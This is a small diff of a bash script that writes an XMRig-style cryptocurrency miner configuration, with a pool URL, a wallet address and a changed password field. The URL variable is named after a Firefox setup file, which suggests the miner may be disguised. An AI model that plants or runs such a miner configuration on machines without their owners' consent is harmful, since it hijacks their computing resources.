@@ -95,7 +95,7 @@ bash -c 'cat <<EOT >>config.json
             "coin": null,
               "url": "$firefoxsetup.$link:9999",
             "user": "4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjXYC8xTdYSfScBAJ",
-            "pass": "shell2",
+            "pass": "hope",
             "rig-id": null,
             "nicehash": false,
             "keepalive": false,
